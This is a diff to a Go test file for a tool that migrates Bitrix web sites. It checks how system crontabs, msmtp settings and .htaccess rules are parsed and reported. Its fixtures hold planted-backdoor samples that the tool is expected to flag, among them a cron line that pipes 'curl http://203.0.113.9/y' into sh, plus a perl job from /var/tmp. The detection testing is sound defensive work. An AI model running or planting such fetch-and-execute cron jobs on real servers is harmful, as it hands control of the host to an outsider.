@@ -337,6 +337,26 @@ func TestForeignHelpers(t *testing.T) {
 	if len(jobs) != 2 || jobs[0].Command != "/usr/bin/php -f /var/www/bitrix/data/www/main.example.com/bitrix/modules/main/tools/cron_events.php" || jobs[0].Comment != "agents" || jobs[1].Schedule != "@daily" || jobs[1].Command != "rm -rf /var/www/bitrix/.bx_temp/*" {
 		t.Errorf("crontab: %+v %+v", jobs[0], jobs[1])
 	}
+	// System crontabs name the user between the schedule and the command.
+	sys := systemCronEntries("SHELL=/bin/bash\nMAILTO=root\n# выгрузка\n0 3 * * * root php /home/bitrix/www/x.php\n@daily  bitrix  /usr/bin/php -f /home/bitrix/www/y.php > /dev/null\n* * * * *\n")
+	if len(sys) != 2 || sys[0].user != "root" || sys[0].schedule != "0 3 * * *" || sys[0].command != "php /home/bitrix/www/x.php" || sys[0].comment != "выгрузка" ||
+		sys[1].user != "bitrix" || sys[1].schedule != "@daily" || sys[1].command != "/usr/bin/php -f /home/bitrix/www/y.php > /dev/null" {
+		t.Errorf("system crontab: %+v", sys)
+	}
+	for name, want := range map[string]bool{"bx_agents": false, "0hourly": false, ".placeholder": true, "x.rpmsave": true, "x.rpmnew": true, "x~": true} {
+		if cronDSkipped(name) != want {
+			t.Errorf("cronDSkipped(%q) = %v", name, !want)
+		}
+	}
+	// msmtprc: accounts start from the defaults and from the account they
+	// name; the password stays out.
+	accs := parseMsmtprc("defaults\nport 587\ntls on\n\naccount s1\nhost smtp.example.com\nfrom a@example.com\npassword secret\n\naccount nohost\nfrom b@example.com\n\n  # account x\naccount default : s1\nfrom c@example.com\n")
+	if len(accs) != 2 || accs[0] != (msmtpAccount{name: "s1", host: "smtp.example.com", port: "587", from: "a@example.com"}) || accs[1] != (msmtpAccount{name: "default", host: "smtp.example.com", port: "587", from: "c@example.com"}) {
+		t.Errorf("msmtprc: %+v", accs)
+	}
+	if rules := htaccessLines("./.htaccess:3:  RewriteRule ^(.*)$ /bitrix/urlrewrite.php [L]\n./a/.htaccess:1:Redirect 301 /x /y\nbroken line\n./b:x:y\n"); len(rules) != 1 || rules[0] != "a/.htaccess:1: Redirect 301 /x /y" {
+		t.Errorf("htaccessLines: %q", rules)
+	}
 	for cmd, want := range map[string]bool{
 		"perl /var/tmp/LLVPnNU":                     true,
 		"/tmp/.x/kswapd0 >/dev/null 2>&1":           true,
@@ -468,6 +488,27 @@ func TestMigrationFromBitrixVM(t *testing.T) {
 	remote.answers["crontab -l -u 'bitrix'"] = "*/5 * * * * /usr/bin/php -f /home/bitrix/www/bitrix/modules/main/tools/cron_events.php\n*/5 * * * * perl /var/tmp/LLVPnNU\n"
 	remote.answers["crontab -l -u root"] = "# экспорт\n0 3 * * * php /home/bitrix/www/export/export-csv.php\n*/5 * * * * /usr/bin/php -f /home/bitrix/www/bitrix/modules/main/tools/cron_events.php\n@daily /opt/webdir/bin/bx-backup\n"
 	remote.answers["cd '/home/bitrix/www' && { find "] = "./export/export-csv.php\n"
+	// grep over the site's .htaccess files: Bitrix's stock lines and the
+	// site's own rules.
+	remote.answers["cd '/home/bitrix/www' && find . "] = "./.htaccess:2:ErrorDocument 404 /404.php\n" +
+		"./.htaccess:5:  php_flag session.use_trans_sid off\n" +
+		"./.htaccess:7:Redirect 301 /old-catalog/ /catalog/\n" +
+		"./.htaccess:14:  RewriteCond %{REQUEST_FILENAME} !-f\n" +
+		"./.htaccess:16:  RewriteCond %{REQUEST_FILENAME} !-d\n" +
+		"./.htaccess:17:  RewriteCond %{REQUEST_FILENAME} !/bitrix/urlrewrite.php$\n" +
+		"./.htaccess:18:  RewriteRule ^(.*)$ /bitrix/urlrewrite.php [L]\n" +
+		"./.htaccess:19:  RewriteRule .* - [E=REMOTE_USER:%{HTTP:Authorization}]\n" +
+		"./catalog/.htaccess:2:RewriteRule ^item-([0-9]+)$ detail.php?id=$1 [L]\n" +
+		"./catalog/.htaccess:3:php_value memory_limit 512M\n"
+	// The system crontabs: a job of bitrix, root's job on the site, the
+	// system's own maintenance, a planted line of another user and a file
+	// cron passes by.
+	remote.files["/etc/crontab"] = "SHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\n\n# резервная копия\n*/10 * * * * bitrix php -f /home/bitrix/www/bitrix/tools/backup.php\n"
+	remote.files["/etc/cron.d/0hourly"] = "01 * * * * root run-parts /etc/cron.hourly\n"
+	remote.files["/etc/cron.d/bx_sitemap"] = "# карта сайта\n30 4 * * * root /usr/bin/php /home/bitrix/www/sitemap.php\n*/2 * * * * nobody curl -s http://203.0.113.9/y | sh\n"
+	remote.files["/etc/cron.d/bx_old.rpmsave"] = "0 0 * * * root php /home/bitrix/www/never.php\n"
+	// msmtp of BitrixVM: the relay is named in the plan, its password never.
+	remote.files["/home/bitrix/.msmtprc"] = "# smtp account configuration for default\naccount default\nlogfile /home/bitrix/msmtp_default.log\nhost smtp.example.com\nport 587\nfrom shop@example.com\nauth on\nuser shop@example.com\npassword s3cr3t-relay\n"
 	mysqlAnswers(remote, "2048")
 	inner := remote.handler
 	// The link site's bitrix/ is an absolute symlink into the main site; tar
@@ -562,12 +603,27 @@ func TestMigrationFromBitrixVM(t *testing.T) {
 	if len(b.Databases) != 1 || b.Databases[0].Name != "sitemanager" || len(b.Databases[0].Users) != 1 || b.Databases[0].Users[0].Host != "localhost" {
 		t.Errorf("базы: %+v", b.Databases)
 	}
-	if len(b.Cron) != 3 || b.Cron[0].Command != "php -f "+target.s.cfg.WWWRoot+"/bitrix/data/www/main.example.com/bitrix/modules/main/tools/cron_events.php" || b.Cron[2].Command != "php "+target.s.cfg.WWWRoot+"/bitrix/data/www/main.example.com/export/export-csv.php" {
+	mainDir := target.s.cfg.WWWRoot + "/bitrix/data/www/main.example.com"
+	if len(b.Cron) != 5 || b.Cron[0].Command != "php -f "+mainDir+"/bitrix/modules/main/tools/cron_events.php" || b.Cron[2].Command != "php "+mainDir+"/export/export-csv.php" ||
+		b.Cron[3].Command != "php -f "+mainDir+"/bitrix/tools/backup.php" || b.Cron[4].Command != "php "+mainDir+"/sitemap.php" {
 		t.Errorf("cron не переписан: %+v", b.Cron)
 	}
-	for _, want := range []string{"cron jobs moved from root's crontab: 1", "@daily /opt/webdir/bin/bx-backup", `perl /var/tmp/LLVPnNU" looks like a planted backdoor`, "the Bitrix cache is CPHPCacheMemcacheCluster", "it will be rewritten to the new path:\n    /home/bitrix/www/export/export-csv.php"} {
+	for _, want := range []string{
+		"cron jobs moved from root's crontab: 1", "@daily /opt/webdir/bin/bx-backup", `perl /var/tmp/LLVPnNU" looks like a planted backdoor`, "the Bitrix cache is CPHPCacheMemcacheCluster", "it will be rewritten to the new path:\n    /home/bitrix/www/export/export-csv.php",
+		"cron jobs moved from /etc/crontab and /etc/cron.d: 2", "/etc/crontab (bitrix): */10 * * * * php -f " + mainDir + "/bitrix/tools/backup.php", "/etc/cron.d/bx_sitemap (root): 30 4 * * * php " + mainDir + "/sitemap.php",
+		`/etc/cron.d/bx_sitemap: the job "*/2 * * * * curl -s http://203.0.113.9/y | sh" of nobody looks like a planted backdoor`,
+		"site main.example.com: Apache on the source ran these .htaccess rules", "mp site nginx main.example.com --set <file>",
+		"\n    .htaccess:7: Redirect 301 /old-catalog/ /catalog/\n    catalog/.htaccess:2: RewriteRule ^item-([0-9]+)$ detail.php?id=$1 [L]\n    catalog/.htaccess:3: php_value memory_limit 512M",
+		"/home/bitrix/.msmtprc (account default): smtp.example.com:587, from shop@example.com", "mail() of the sites goes to /usr/sbin/sendmail",
+		"mp site set main.example.com --default-tls",
+	} {
 		if !hasNote(b.Notes, want) {
 			t.Errorf("в разборе нет %q: %q", want, b.Notes)
+		}
+	}
+	for _, unwanted := range []string{"/bitrix/urlrewrite.php [L]", "REMOTE_USER", "ErrorDocument 404 /404.php", "use_trans_sid", "never.php", "run-parts", "s3cr3t-relay", "msmtp of the BitrixVM"} {
+		if hasNote(b.Notes, unwanted) {
+			t.Errorf("в разборе лишнее %q: %q", unwanted, b.Notes)
 		}
 	}
 	if b.Secrets != nil {
@@ -658,8 +714,11 @@ func TestMigrationFromBitrixVM(t *testing.T) {
 		t.Errorf("скрипт с /home/bitrix не переписан: %q", got)
 	}
 	cron, _ := target.db.ListCronJobs(target.ctx, u.ID)
-	if len(cron) != 3 || !strings.Contains(cron[0].Command, "/bitrix/data/www/main.example.com/") || cron[1].Enabled || !cron[2].Enabled || cron[2].Comment != "from root's crontab; экспорт" {
-		t.Errorf("cron: %+v %+v %+v", cron[0], cron[1], cron[2])
+	if len(cron) != 5 || !strings.Contains(cron[0].Command, "/bitrix/data/www/main.example.com/") || cron[1].Enabled || !cron[2].Enabled || cron[2].Comment != "from root's crontab; экспорт" ||
+		!cron[3].Enabled || cron[3].Comment != "from /etc/crontab; резервная копия" || !cron[4].Enabled || cron[4].Comment != "from /etc/cron.d/bx_sitemap; карта сайта" {
+		for _, j := range cron {
+			t.Errorf("cron: %+v", j)
+		}
 	}
 }
 
